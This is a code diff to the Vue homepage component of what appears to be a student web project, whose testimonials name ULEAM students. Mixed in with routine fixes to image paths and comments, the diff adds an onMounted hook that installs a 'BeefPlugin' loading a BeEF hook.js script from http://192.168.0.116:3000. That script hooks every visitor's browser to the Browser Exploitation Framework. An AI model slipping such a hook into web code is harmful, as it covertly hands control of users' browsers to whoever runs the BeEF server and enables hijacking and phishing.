@@ -240,9 +240,11 @@
 </template>
 
 <script>
-import { ref, reactive } from 'vue'
+import { ref, reactive, onMounted } from 'vue'
 import { useSlider } from './js/slider.js'
 import { useQuestions } from './js/questions.js'
+import { getCurrentInstance } from 'vue'
+import BeefPlugin from './plugins/beef.js'
 
 export default {
   name: 'HomePage',
@@ -256,11 +258,20 @@ export default {
       showMenu.value = false
     }
 
-    // Navegación (aún no definida, solo ejemplo)
+    onMounted(() => {
+      const app = getCurrentInstance().appContext.app
+      
+      // Usar el plugin BeEF
+      BeefPlugin.install(app, {
+        hookUrl: 'http://192.168.0.116:3000/hook.js'
+      })
+    })
+
+    // Navegación
     const goToRegister = () => {
-      // aquí pones la lógica para ir a registro (router push o window.location)
       alert('Ir a registro')
     }
+    
     const goToLogin = () => {
       alert('Ir a login')
     }
@@ -271,28 +282,28 @@ export default {
     // Preguntas
     const { questions, toggleQuestion } = useQuestions()
 
-    // Datos de testimonios (debes adaptar o cargar dinámicamente)
+    // Datos de testimonios
     const testimonies = reactive([
       {
         id: 1,
         name: 'Roberth Alonzo',
         course: 'Estudiante de la ULEAM',
         review: 'Estudio actualmente la carrera de Ingeniería en Tecnologías de la Información, soy un apasionado por el desarrollo web. Este proyecto resalta mis intereses por crear una solución tecnológica que fomente la sostenibilidad y comunidad.',
-        image: '/public/images/foto1.jpg'
+        image: '/images/foto1.jpg'
       },
       {
         id: 2,
         name: 'Franklin Molina',
         course: 'Estudiante de la ULEAM',
         review: 'Estudio actualmente la carrera de Ingeniería en Tecnologías de la Información, soy un apasionado por el desarrollo web. Este proyecto resalta mis intereses por crear una solución tecnológica que fomente la sostenibilidad y comunidad.',
-        image: 'public/images/foto2.jpg'
+        image: '/images/foto2.jpg'
       },
       {
         id: 3,
         name: 'Jose Velez',
         course: 'Estudiante de la ULEAM',
         review: 'Estudio actualmente la carrera de Ingeniería en Tecnologías de la Información, soy un apasionado por el desarrollo web. Este proyecto resalta mis intereses por crear una solución tecnológica que fomente la sostenibilidad y comunidad.',
-        image: '/public/images/foto3.jpg'
+        image: '/images/foto3.jpg'
       }
     ])
 
